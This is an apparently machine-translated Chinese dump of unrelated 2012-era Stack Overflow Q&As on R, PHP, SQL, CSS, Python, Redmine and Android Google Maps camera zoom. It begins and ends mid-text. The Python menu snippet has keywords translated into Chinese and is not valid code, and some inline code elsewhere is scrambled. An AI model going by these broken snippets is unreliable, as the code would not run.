[http://nlp.stanford.edu/~manning/courses/ling289/cedegren-varbrul.html](http://nlp.stanford.edu/~manning/courses/ling289/cedegren-varbrul.html)

将使用 glm 函数来查看它是如何在这个数据集上工作的

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T22:40:58.350

```
> require(utils)
> inp <- read.fwf(file=url("http://www-nlp.stanford.edu/~manning/courses/ling236/handouts/panama-mac.tok"), 
                 widths=rep(1, 5), colClasses=c("NULL", rep("factor",4) ) )
> str(inp)
'data.frame':   8955 obs. of  4 variables:
 $ V2: Factor w/ 3 levels "0","1","L": 2 2 2 2 2 2 2 2 2 2 ...
 $ V3: Factor w/ 6 levels "a","A","d","m",..: 4 4 4 4 4 4 4 4 4 4 ...
 $ V4: Factor w/ 4 levels "C","P","S","V": 1 1 1 1 1 1 1 1 1 1 ...
 $ V5: Factor w/ 5 levels "1","2","3","4",..: 1 1 1 1 1 1 1 1 1 1 ... 
```

如果需要，您可以重命名这些列并为因素提供标签以使其更具自记录性，但可以按原样作为 glm 数据集运行。

# google-maps - 使用 Geoxml3 在 Google 地图上加载 KML 图层

> ID：14074092
> 
> 赞同：0
> 
> 时间：2012-12-28T18:34:29.180
> 
> 标签：google-maps

我想使用 Geoxml3 在 googlemap 上加载 kmlfile，googlemap 已加载但未显示图层，我不知道我的代码有什么问题，谁能帮忙？

```
<script type="text/javascript">
jQuery(document).ready(function () {        
var myOptions = {
        center: new google.maps.LatLng(39.397, -100.644),
        zoom: 4,
        mapTypeId: google.maps.MapTypeId.ROADMAP
    };
    var map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);

    var geoXml = new geoXML3.parser({
        map: map,
        singleInfoWindow: true,
        afterParse: useTheData
    });
    geoXml.parse('KML_Samples.kml');
    });

    function useTheData(doc) {
    // Geodata handling goes here, using JSON properties of the doc object
    for (var i = 0; i < doc[0].markers.length; i++) {
        console.log(doc[0].markers[i].title);
        jQuery('#map_text').append(doc[0].markers[i].title + ', ');
    }
    };
</script>

</head>
<body >
 <form id="form1">

    <div id="map_canvas" style="width:600px;height:500px;"></div>

    <div id="map_text"></div>
    </form>
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:37:56.437

你的代码，至少和你发布的一样多，对我来说很好。

这是一个[工作示例](http://www.geocodezip.com/geoxml3_test/v3_geoxml3_KML_Samples.html)

# php - 使用 JQuery 访问 HTML 下拉菜单值，然后调用 PHP 函数

> ID：14074093
> 
> 赞同：1
> 
> 时间：2012-12-28T18:34:30.610
> 
> 标签：php, jquery, drop-down-menu

在尝试严格使用 Ajax 解决我的问题但未成功后，我转向了 JQuery。不幸的是，我对 JQuery 的了解有限，希望有人能告诉我我做错了什么。我在这个问题上花了几天时间，但基本上一无所获！

理论上我的任务很简单，我要做的就是获取 HTML 下拉菜单的值并使用下拉菜单的相应行调用 php 函数。php 函数 print_wp_cart_button_for_product 输出添加到购物车按钮。该函数将通过与我的产品数组中的项目相对应的行来调用。

```
<TR>
   <TD>
   <select id="productcategory1" name="productcategory1" onchange="productchange()">
    <option value="$">--Please Select--</option>
    <option value="1">Product # 1 - $1.99</option>
    <option value="2">Product # 2 - $1.99</option>
    <option value="3">Product # 3 - $9.99</option>
    <option value="4">Product # 4 - $9.99</option>
  </select>
  </TD>
  <TD>    

  <div id="test">
  </div>

  <script type = "text/javascript">
  function productchange() 
  {
      var currentrow = $('#productcategory1').val();
      //alert(currentrow);

      $.ajax({
        type: "GET",
        url: "http://www.example.com/wp-content/themes/themeX/order.php",
        data: "rownum=" + currentrow,
        success: function(currentrow){
            $("#test").html(currentrow);
            }});
      return false;
  }
  </script>

  <?php $rownum = $_GET['test']; ?>
  <?php echo print_wp_cart_button_for_product($products[$rownum]["Product"], $products[$rownum]["Price"]); ?>
  </TD>
  </TR> 
```

订单.php：

```
<?php
$rownum = $_GET['rownum'];
echo "Row Number = $rownum";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T18:44:32.497

```
$.ajax({
        type: "GET",
        url: "http://www.example.com/wp-content/themes/themeX/order.php",
         data: {'rownum': currentrow},
        success: function(currentrow){
            $("#test").html(currentrow);
            }}); 
```

试试看。还

```
<?php $rownum = $_GET['test']; ?> 
```

你努力关闭最后一个 php 并开始另一个..这首先给出错误

您的代码中的一切都很好……据我所知。您是否包含了 jquery 库文件？

# sql - 比较地址

> ID：14074096
> 
> 赞同：-1
> 
> 时间：2012-12-28T18:34:56.247
> 
> 标签：sql, sql-server, sql-server-2008, sql-server-2008-r2

我的查询中有一个名为地址的字段。现在这是要求：如果此地址等于包含该地址的另一个字段，则给出一些指示，如 (*)

例如：

这个字段：[address,city,state] 使用 , 连接。地址、城市和州是表中的不同字段。我已经使用 , 连接了。现在我想验证这整个字段是否等于另一个包含地址、城市、州的字段。

谁能给我一些示例查询

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T18:45:50.447

如果我对您的理解正确，那么这应该对您有用：

```
Select * From AddressTable at Where at.Address + ',' + at.City + ',' + at.State = @YourVariable 
```

如果您的任何变量不是基于文本的，则需要在连接之前进行转换，如下所示：

```
Cast(Name as NVarChar(max)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T18:54:15.527

如果我理解正确，则连接字段与单个字段在同一个表中，并且您正在查看值是否在每条记录的基础上匹配。如果是这样的话，那么像这样

```
UPDATE [AddressTable] at
SET at.[Indicator] = '*'
WHERE at.[address,city,state] = at.[Address] + ',' + at.[City] + ',' + at.[State]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T20:05:40.383

如果我理解你的问题，这应该是解决方案：

```
SELECT
  CASE
    WHEN (SELECT COUNT(*) FROM AddressTable WHERE Address = a.Address) > 1 THEN '* ' + Address
    ELSE Address
  END
FROM AddressTable a 
```

# c# - ASP .NET 用户配置文件中的 WebSecurity 未创建

> ID：14074099
> 
> 赞同：0
> 
> 时间：2012-12-28T18:35:10.413
> 
> 标签：c#, asp.net, security

我在我的 asp.net 网站中使用 WebSecurity，我在 _AppStart.cshtml 中编写了一个代码

```
@{
    WebSecurity.InitializeDatabaseConnection("Membership","UserProfile", "UserId", "UserName", true);
} 
```

我正在通过以下代码创建我的帐户

```
 if(!WebSecurity.UserExists(username))
            {
                WebSecurity.CreateUserAndAccount(username,password);

            } 
```

但是用户配置文件没有创建。请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:11:56.197

你不应该使用[这个覆盖](http://msdn.microsoft.com/en-us/library/webmatrix.webdata.websecurity.createuserandaccount%28v=vs.111%29.aspx)吗？因为第三个参数采用属性值列表，该列表将存储在用户配置文件功能中。

# php - 通过 CLI 获取“不推荐使用以 '#' 开头的评论”消息

> ID：14074101
> 
> 赞同：43
> 
> 时间：2012-12-28T18:35:18.027
> 
> 标签：php

我对服务器 php 配置文件的访问权限非常有限。

当我运行一些涉及写入日志文件的 cron 脚本时，我收到这样的警告

```
Comments starting with '#' are deprecated in /etc/php5/cli/conf.d/ming.ini on line 1 in Unknown on line 0 
```

我搜索了很多以找到原因，我知道我们需要用 ';' 替换 '#' 在 ming.ini 文件中。

我将此通知给我的服务器管理员以解决此问题

下面是我得到这个修复的链接

[如何修复：PHP 已弃用的错误](http://www.r00t.gr/how-to-fix-php-deprecated-comments-starting-with-are-deprecated-in-etcphp5cliconf-dming-ini-on-line-1-in-unknown-on-line-0/)

后来，对于一些脚本问题得到了修复，但对于其中一些我开始在不同的 php 配置文件中遇到相同的错误

例如。

```
PHP Deprecated:  Comments starting with ‘#’ are deprecated in /etc/php5/cli/conf.d/imagick.ini on line 1 in Unknown on line 0

PHP Deprecated:  Comments starting with ‘#’ are deprecated in /etc/php5/cli/conf.d/imap.ini on line 1 in Unknown on line 0 
```

实际上是什么问题，下面是我的服务器规范

操作系统：ubuntu 12 php：5.4

这是一种常见的行为吗？我需要将这些注释从“#”更改为“；”吗？在每个文件中。

或者这是 PHP 5.4 的问题。

如果您有任何信息或避免在应用程序级别（代码）出现此错误的简单方法，请提供任何信息

提前感谢您阅读这篇文章

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2013-02-09T08:18:04.497

您可以使用以下 shell 命令修补注释：

```
find /etc/php5/cli/conf.d/ -name "*.ini" -exec sed -i -re 's/^(\s*)#(.*)/\1;\2/g' {} \; 
```

它基本上找到*/etc/php5/cli/conf.d/*`.ini`下的所有文件并在其上执行*sed*，它将任何注释行文字替换为.**`#``;`**

 *** * *

## 回答 #2

> 赞同：30
> 
> 时间：2013-08-25T14:58:39.873

您需要在 php.ini 文件中找到以 '#' 开头的行并将其更改为 ';'

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-24T04:42:16.083

它表明在您的 php.ini 文件中有一些错误。要解决它，您可以使用以下命令加载默认的 php.ini 文件。

它会将您以前的 php.ini 文件重命名为 php.ini_old。

```
sudo mv /etc/php5/apache2/php.ini /etc/php5/apache2/php.ini_old 
```

它会将默认的 php.ini 文件复制到 /etc/php5/apache2/ 位置。

```
sudo cp /usr/share/php5/php.ini-production /etc/php5/apache2/php.ini 
```

希望它有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-30T14:32:46.980

就我而言，我必须解析 mysql.ini 和 php.ini 文件。您无法控制这些文件中注释的使用方式，因此我仅针对该行禁止了警告。

```
$parse_sections = true;
$cfg = @parse_ini_file($file, $parse_sections); 
```

我确信有一种方法是逐行读取文件，替换“#”注释，然后使用 parse_ini_string() 解析整个内容，但这会增加一点开销。

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2013-01-30T14:20:42.360

您可以尝试设置 PHP error_reporting 配置，如下所示：

```
ini_set("error_reporting", E_ALL & ~E_DEPRECATED); 
```

但是，**这只是临时修复**。收到这样的警告意味着对于更高版本的 PHP，它将不再工作，因为配置文件将被视为无效。最好联系您的主机并要求他们修复它；应该不会太难。**

# php - 使用 SQL 查询在给定位置信息处查找数据

> ID：14074106
> 
> 赞同：2
> 
> 时间：2012-12-28T18:35:37.287
> 
> 标签：php, sql, mysqli

我有一个如下表结构

```
idx   p_id    location_id  

1     CTX      A1
2     CTX      A2
3     ABC      A3
4     ABC      A1 
```

idx 是自动递增编号，表示最新位置（对于产品 CTX 情况，它从 A1 转移到 A2）

现在，我要查找的是位置 A1 中的任何产品。我应该只找到产品 ABC，因为产品 CTX 从 A1 移动到 A2，它不再在 A1 中

有没有简单的方法来执行 SQL 查询？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T18:43:15.263

假设您要查找给定 p_id 的最大 dx 位置为“A1”的所有行

```
SELECT t.* 
FROM   table1 t 
       INNER JOIN (SELECT p_id, 
                          Max(dx) dx 
                   FROM   table1 
                   GROUP  BY p_id) max_dx 
               ON t.dx = max_dx.dx 
WHERE  t.location_id = 'A1' 
```

[SQL小提琴](http://sqlfiddle.com/#!2/50565/6)

如果您由于某种原因不喜欢子查询，您可以对 PK 上的不等式执行 ANTI-JOIN

```
SELECT t.* 
FROM   table1 t 
       LEFT JOIN table1 t2
       ON t.p_id = t2.p_id 
          and t.dx < t2.dx
WHERE
     t2.dx IS NULL
     and t.location_id = 'A1' 
```

[SQL小提琴](http://sqlfiddle.com/#!2/50565/11)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:40:07.823

好的，在重新阅读您的问题后，我认为这更需要您：

```
SELECT idx, p_id, location_id
FROM tablename t0 JOIN (
  SELECT MAX(idx) AS m
  FROM tablename
  GROUP BY p_id) t1
  ON t0.idx = t1.m
WHERE t0.location_id = 'A1'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T18:42:10.330

最笨的方法：

```
SELECT TOP 1 PRODUCT_ID
FROM YOUR_TABLE
WHERE
 LOCATION_ID = "A1" -- of course use parameter in real application!
ORDER BY
 ID DESC 
```

然而！这是不正确的，因为不能安全地依赖 IDS 的排序（即使它在 99% 的情况下都有效）。为什么不添加时间戳列？

您还可以使用 MAX() 函数来获取返回最大 ID 的子查询：

```
SELECT PRODUCT_ID
 FROM YOUR_TABLE
 WHERE
 LOCATION_ID = "A1" -- of course use parameter in real application!
AND
 ID = SLECT MAX(ID) FROM YOUR_TABLE WHERE LOCATION_ID = "A1" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T18:44:27.007

您可以使用 ROW_NUMBER 获取最新位置，而无需使用相关子查询。

```
SELECT * FROM
(
    SELECT p_id, location_id, ROW_NUMBER() OVER(PARTITION BY p_id ORDER BY idx DESC) RowNumber
) x
WHERE RowNumber = 1 AND location_id = 'A1' 
```

# css - 当前页面导航上的不同颜色

> ID：14074107
> 
> 赞同：0
> 
> 时间：2012-12-28T18:35:42.293
> 
> 标签：css

我不认为标题很好地解释了我的问题。基本上，在我的导航栏上，我希望当前页面是不同的颜色。

因此，例如，如果所有导航链接都是黑色的，我希望主页的当前页面是红色的。我已经通过给当前页面链接一个类然后给它定义一个颜色来尝试这个，但是它似乎没有改变。

这是我的代码：http: [//jsfiddle.net/SCd4h/](http://jsfiddle.net/SCd4h/)

```
 <style>
.box {
text-align: center;
background-color: #F1F2F2;
border: 1.5px #D1D3D4 solid;
border-bottom: 3px solid red;
    margin: 5px;
    padding: 10px;
}
p {
font-size: 15px;
font-family: arial;
color: #585858;
}
.logo {
margin-left:70px;
margin-top: -160px;
}
a:visited {
  text-decoration: none;
  color: black;
  font-weight: normal;
}
a:link {
  text-decoration: none;
  color: black;
  letter-spacing: 500;
}
a:hover {
  text-decoration: none;
  color: #FC3B3B;
  background: white;
}
a:active {
  text-decoration: none;
  color: red;
  font-weight: normal;
}

ul {
list-style-type:none;
margin-right:50px;
margin-top: 60px;
padding:5px;
overflow: hidden;
font-family: 'Paytone One', sans-serif;
font-size: 18px;
}
li {
display:inline;
float:right;
margin-right: 30px;
}
.current {
font-family: 'Paytone One', sans-serif;
font-size: 18px;
color:red;
}
</style> 
```

```
<body>
<ul>
<li><a href="index.html"/>HOME</a></li>
<li><a href="blog.html"/>BLOG</a></li>
<li><a href="photo.html" class="current"/>PHOTOS</a><li>
<li><a href="projects.html"/>PROJECTS</a></li>
</ul>

</br>
<img class="logo" src="louis2.png" alt="." width="149px" height="150px"/>
<div class="box">

</div>
<div class="box1">
</div>
<p>louismoore.net © All rights reserved 2012</p>
</body> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T18:41:01.673

你的问题是[特异性](http://coding.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/)。

尝试

`a.current`反而。

此外，`/`从打开的 A 标签中删除。应该结构化`<a>...</a>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:44:15.540

我建议采用不同的方法，而不是将类应用于每个页面的相应链接，因为您需要为每个不同页面更改导航的标记。在每个页面的正文中添加一个类来标识页面，然后为每个链接添加另一个类，标识链接，然后编写将它们组合起来的 css：

```
.home .home_link,
.blog .blog_link,
.photos .photos_link,
.projects .projects_link {
    color: red;
} 
```

这样，css 会自动应用，而无需为每个页面的导航编写不同的标记。

这是一个要演示的[jsfiddle](http://jsfiddle.net/SCd4h/1/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T18:43:10.770

`a:link``.current`比（只是一个类）有更多的说明符（一个标签名和一个伪类）。你可以通过说覆盖它

```
a.current 
```

因为它有一个 tagName 和一个类，它覆盖了一个 tagName 和伪类。

# php - 使用 PHP 和 SPARQL 查询 RDF 文件。帮助和建议？

> ID：14074112
> 
> 赞同：2
> 
> 时间：2012-12-28T18:35:53.720
> 
> 标签：php, rdf, sparql, virtuoso

Virtuoso 的终点是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T11:06:43.430

对于 Virtuoso 服务器，默认 SPARQL 端点将位于以下 URL：

```
http://localhost:8890/sparql 
```

您的代码可能无法正常工作，因为您使用的是非 SPARQL 端点作为 URL

# winjs - ListViews 中的动画

> ID：14074119
> 
> 赞同：1
> 
> 时间：2012-12-28T18:36:57.107
> 
> 标签：winjs

我正在设计一个应用程序，该应用程序的页面具有拖曳列表视图。让我们称它们为“MainListView”和“SecondaryListView”。两个列表视图并排放置（“MainListView”在左侧，“SecondaryListView”在右侧）。这两个列表中的数据是来自 Web API 的父子数据。

场景一：

流程如下：

1.  初始化页面时，“SecondaryListView”（1 级数据）中存在初始父数据。

2.用户单击“SecondaryListView”中的一项。单击的数据移动到“MainListView”，“SecondaryListView”现在由子项或选定项更新。

1.  这个序列一直持续到到达最后一个孩子。

场景二：

假设用户已升到第 5 级。第 1、2、3、4、5 级选定数据在“MainListView”中，“SecondaryListView”具有第 5 级选定数据的子项。

1.  现在用户在“MainListView”中选择第二级选定数据。

2.  第 3、4、5 级数据从“MainListView”中删除，“SecondaryListView”被第 2 级的子级填充。

我的要求是我需要添加一些动画。这是所需的动画：

1.  在场景 1 中，当用户从“SecondaryListView”中选择一项时，该项目将滑向“MainListView”并添加到列表底部。目前它刚刚被添加。没有幻灯片动画。

2.  在场景 2 中，当用户从“MainListView”中选择一个项目时，其他被删除的元素（例如第 3、4、5 个）应该在列表中向下滑动并消失。目前还没有实现滑动和删除动画。

我的列表都使用数据绑定和使用模板。该功能完全可以使用所需的动画。目前，如果我更改绑定数据，则该功能可以正常工作，但动画是我无法使其正常工作的。

任何的意见都将会有帮助。

*   吉里哈

# python - IDLE - Python：回到某一行，我该怎么做？

> ID：14074124
> 
> 赞同：0
> 
> 时间：2012-12-28T18:37:11.957
> 
> 标签：python, if-statement, python-idle

我创建了一个选择菜单，要求您输入要运行的命令，我已经通过使用`if`和`elif`语句完成了此操作，但是当命令（if 语句）完成时，我希望他们转到询问哪个命令运行。这是我目前拥有的代码（现在我没有这样做）：

```
# 询问您要运行哪个命令。
word = input("哪个命令？")

# 运行命令/s。

如果单词 == “信息”：
    print("信息命令。")

elif 字 == “替换”：
    print("替换命令")

elif 字 == “平”：
    print("Ping 命令")

别的：
    print("找不到命令")

```

如果有人可以提供帮助，那就太棒了，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:44:46.390

抱歉，如果这太多了，但是您可能需要考虑将其放入函数中以执行以下操作：

```
def main():
    # Asks which command you want to run.
    word = input("Which command? ").strip().lower()

    # Runs the command/s.

    if word == "info":
        print("Info command.")

    elif word == "replace":
        print("Replace command.")

    elif word == "ping":
        print("Ping command")

    elif word == "quit":
        return False

    else:
        print("Command not found")
    return True

while main():
    pass 
```

这将与`while True`那时相同`if something: break`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T18:40:40.663

尝试将您的代码包装在一个`while True:`块中。这将无限期地重复代码。

如需进一步阅读，请尝试[此](http://wiki.python.org/moin/WhileLoop)

# ruby-on-rails - redmine 插件开发 NameError

> ID：14074125
> 
> 赞同：0
> 
> 时间：2012-12-28T18:37:18.493
> 
> 标签：ruby-on-rails, plugins, redmine

我不是 Rails 开发人员。我是一名系统工程师，试图创建一个简单的 redmine 插件来显示备份文件夹的内容。基本上是 Dir.glob("/path/to/folder") 的输出。我可以在 irb 控制台中实现这一点。

我遵循了官方的 redmine 插件教程。我不需要任何模型，因为我不想存储任何数据库。这只是显示文件系统内容的视图。我创建了一个自动生成视图的控制器。我收到名称错误。粘贴我为相关文件制作的代码。请帮助我制作一个仅将文件夹内容输出到浏览器的 redmine 插件。另外我如何执行某些系统调用并在插件中显示输出？

插件名称：redmine_backups

控制器：backups_controller.rb 我根本没有碰过这个文件。

应用程序/视图/备份/index.html.erb

```
<h2>Backups#index</h2>

<table>
<ul>
<% @files = Dir.glob("/tmp/*") %>
<% @files.each do |f| %>
<%= f %>
<% end %>
</ul>
</table> 
```

redmin_backups/init.rb

```
require 'redmine'

Redmine::Plugin.register :redmine_backups do
name 'Redmine Database Backups plugin'
author 'Author'
description 'This is a plugin for displaying database backups within Redmine'
version '0.0.1'
url 'http://example.com/path/to/plugin'
author_url 'http://example.com/about'

menu :application_menu, :backups, { controller => 'backups', :action => :index }, :caption => 'Backups', :last => 'true'
end 
```

我得到的错误是 `undefined local variable or method 'controller' for #<Redmine::Plugin:0x7f28330ca2f8>`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T22:22:35.043

您需要在倒数第二行的控制器前面加一个冒号。它应该这样读`menu :application_menu, :backups, { :controller => 'backups', :action => :index }, :caption => 'Backups', :last => 'true'`：控制器是一个红宝石符号。

# android - Google Maps v2 - 设置我的位置并放大

> ID：14074129
> 
> 赞同：125
> 
> 时间：2012-12-28T18:37:32.260
> 
> 标签：android, api, google-maps, google-maps-api-2

我的问题是，有谁知道如何设置谷歌地图，打开我的位置和放大视图？

目前，主视图向非洲开放，一路缩小。

所以我已经搜索了好几天，我能找到的只有：

1）您不能在一张谷歌地图中为两件事制作动画（例如放大并转到我的位置）？所以如果我能在设置动画之前弄清楚如何设置缩放，那么这个问题就解决了。这往往是问题，你可以改变一个，但不能同时改变。

2) 我找到了其他可能有用的类，但没有帮助说明如何设置代码以便该类可以操作谷歌地图。

这是迄今为止我一直坚持的代码，有些有效，有些无效。有些我认为以后可能有用。

```
package com.MYWEBSITE.www;

import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.SupportMapFragment;
import com.google.android.gms.maps.model.LatLng;
import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.v4.app.FragmentActivity;
import android.view.Menu;

public class MainActivity extends FragmentActivity {
private GoogleMap map;  

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main_layout);

    map = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map)).getMap();
    map.setMyLocationEnabled(true);

    //LocationSource a = (LocationSource) getSystemService(Context.LOCATION_SERVICE);
    //LocationManager b = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    //map.setLocationSource(a);

    Criteria criteria = new Criteria();
    LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    String provider = locationManager.getBestProvider(criteria, false);
    Location location = locationManager.getLastKnownLocation(provider);
    double lat =  location.getLatitude();
    double lng = location.getLongitude();
    LatLng coordinate = new LatLng(lat, lng);

    //CameraPosition.Builder x = CameraPosition.builder();
    //x.target(coordinate);
    //x.zoom(13);

    //Projection proj = map.getProjection();
    //Point focus = proj.toScreenLocation(coordinate);

    //map.animateCamera(CameraUpdateFactory.newLatLng(coordinate));
    map.animateCamera(CameraUpdateFactory.zoomBy(13));
    //map.moveCamera(CameraUpdateFactory.newLatLng(coordinate));

    ////LatLngBounds bounds = mMap.getProjection().getVisibleRegion().latLngBounds;
}
} 
```

* * *

## 回答 #1

> 赞同：207
> 
> 时间：2012-12-28T19:51:33.920

> 您不能在一张谷歌地图中为两件事制作动画（例如放大并转到我的位置）？

从编码的角度来看，您将按顺序执行它们：

```
 CameraUpdate center=
        CameraUpdateFactory.newLatLng(new LatLng(40.76793169992044,
                                                 -73.98180484771729));
    CameraUpdate zoom=CameraUpdateFactory.zoomTo(15);

    map.moveCamera(center);
    map.animateCamera(zoom); 
```

在这里，我首先移动相机，然后为相机设置动画，尽管两者都可以`animateCamera()`调用。是否`GoogleMap`将这些合并到一个事件中，我不能说，因为它进行得太快了。:-)

这是我从中提取上述代码[的示例项目。](https://github.com/commonsguy/cw-omnibus/tree/master/MapsV2/NooYawk)

* * *

对不起，这个答案有缺陷。请参阅[Rob 的答案](https://stackoverflow.com/a/14225760/296108)，了解一种真正一次性完成此操作的方法，方法是创建 a `CameraPosition`，然后`CameraUpdate`从中创建 a `CameraPosition`。

* * *

## 回答 #2

> 赞同：168
> 
> 时间：2013-01-08T23:20:52.407

可以一次性更改位置、缩放、方位和倾斜。也可以设置`animateCamera()`通话时长。

```
CameraPosition cameraPosition = new CameraPosition.Builder()
    .target(MOUNTAIN_VIEW)      // Sets the center of the map to Mountain View
    .zoom(17)                   // Sets the zoom
    .bearing(90)                // Sets the orientation of the camera to east
    .tilt(30)                   // Sets the tilt of the camera to 30 degrees
    .build();                   // Creates a CameraPosition from the builder
map.animateCamera(CameraUpdateFactory.newCameraPosition(cameraPosition)); 
```

看看这里的文档：

[https://developers.google.com/maps/documentation/android/views?hl=en-US#moving_the_camera](https://developers.google.com/maps/documentation/android/views?hl=en-US#moving_the_camera)

* * *

## 回答 #3

> 赞同：54
> 
> 时间：2013-04-15T15:36:50.613

这是您问题的简单解决方案

```
LatLng coordinate = new LatLng(lat, lng);
CameraUpdate yourLocation = CameraUpdateFactory.newLatLngZoom(coordinate, 5);
map.animateCamera(yourLocation); 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2013-02-14T20:37:30.647

以这种方式尝试 -

```
public class SummaryMapActivity extends FragmentActivity implements LocationListener{

 private GoogleMap mMap;
 private LocationManager locationManager;
 private static final long MIN_TIME = 400;
 private static final float MIN_DISTANCE = 1000;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.summary_mapview);

    if (mMap == null) {
        // Try to obtain the map from the SupportMapFragment.
        mMap = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map))
                .getMap();
        // Check if we were successful in obtaining the map.
        if (mMap != null) {
            mMap.addMarker(new MarkerOptions().position(new LatLng(0, 0)).title("Marker"));
        }
    }
    mMap.setMyLocationEnabled(true);

    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME, MIN_DISTANCE, this); 

}

@Override
public void onLocationChanged(Location location) {
    LatLng latLng = new LatLng(location.getLatitude(), location.getLongitude());
    CameraUpdate cameraUpdate = CameraUpdateFactory.newLatLngZoom(latLng, 15);
    mMap.animateCamera(cameraUpdate);
    locationManager.removeUpdates(this);

}

@Override
public void onProviderDisabled(String provider) {
    // TODO Auto-generated method stub

}

@Override
public void onProviderEnabled(String provider) {
    // TODO Auto-generated method stub

}

@Override
public void onStatusChanged(String provider, int status, Bundle extras) {
    // TODO Auto-generated method stub

} 
```

}

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2013-01-08T21:03:10.617

您还可以设置这两个参数，例如，

```
mMap.moveCamera( CameraUpdateFactory.newLatLngZoom(new LatLng(21.000000, -101.400000) ,4) ); 
```

这会将您的地图定位在特定位置并缩放。我在设置我的地图时使用它。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-02-03T10:59:09.077

这是一个迟到的答案，但我认为它会有所帮助。使用此方法：

```
protected void zoomMapInitial(LatLng finalPlace, LatLng currenLoc) {
    try {
        int padding = 200; // Space (in px) between bounding box edges and view edges (applied to all four sides of the bounding box)
        LatLngBounds.Builder bc = new LatLngBounds.Builder();

        bc.include(finalPlace);
        bc.include(currenLoc);
        googleMap.moveCamera(CameraUpdateFactory.newLatLngBounds(bc.build(), padding));
    } catch (Exception e) {
        e.printStackTrace();
    }
} 
```

加载地图后使用此方法。干杯!

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-10-28T11:22:50.783

最简单的方法是使用 CancelableCallback。您应该检查第一个操作是否完成，然后调用第二个：

```
mMap.animateCamera(CameraUpdateFactory.newLatLngBounds(bounds, size.x, height, 0), new CancelableCallback() {

                @Override
                public void onFinish() {
                    CameraUpdate cu_scroll = CameraUpdateFactory.scrollBy(0, 500);
                    mMap.animateCamera(cu_scroll);
                }

                @Override
                public void onCancel() {
                }
            }); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-01-21T18:45:57.283

@CommonsWare 的答案实际上不起作用。我发现这工作正常：

```
map.moveCamera(CameraUpdateFactory.newLatLngZoom(new LatLng(-33.88,151.21), 15)); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-11-05T09:56:47.957

1.在布局中添加xml代码以显示地图。

2.启用google maps api然后获取下面的api key位置。

```
<fragment
                   android:id="@+id/map"
               android:name="com.google.android.gms.maps.MapFragment"
                    android:layout_width="match_parent"
                    android:value="ADD-API-KEY"
                    android:layout_height="250dp"
                    tools:layout="@layout/newmaplayout" />
        <ImageView
            android:id="@+id/transparent_image"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:src="@color/transparent" /> 
```

3.在oncreate中添加此代码。

```
 MapFragment mapFragment = (MapFragment) getFragmentManager().findFragmentById(R.id.map);
    mapFragment.getMapAsync(UpadateProfile.this); 
```

4.在oncreate后添加此代码。然后使用放置在该位置的标记访问当前位置

```
@Override
public void onMapReady(GoogleMap rmap) {
    DO WHATEVER YOU WANT WITH GOOGLEMAP
    map = rmap;
    setUpMap();
}
public void setUpMap() {
    map.setMapType(GoogleMap.MAP_TYPE_HYBRID);
  map.setMyLocationEnabled(true);
    map.setTrafficEnabled(true);
    map.setIndoorEnabled(true);
    map.getCameraPosition();
    map.setBuildingsEnabled(true);
    map.getUiSettings().setZoomControlsEnabled(true);
    markerOptions = new MarkerOptions();
    markerOptions.title("Outlet Location");
    map.setOnMapClickListener(new GoogleMap.OnMapClickListener() {
        @Override
        public void onMapClick(LatLng point) {
            map.clear();
            markerOptions.position(point);
            map.animateCamera(CameraUpdateFactory.newLatLng(point));
            map.addMarker(markerOptions);
            String all_vals = String.valueOf(point);
            String[] separated = all_vals.split(":");
            String latlng[] = separated[1].split(",");
            MyLat = Double.parseDouble(latlng[0].trim().substring(1));
            MyLong = Double.parseDouble(latlng[1].substring(0,latlng[1].length()-1));
            markerOptions.title("Outlet Location");
            getLocation(MyLat,MyLong);
        }
    });
}
public void getLocation(double lat, double lng) {
    Geocoder geocoder = new Geocoder(UpadateProfile.this, Locale.getDefault());
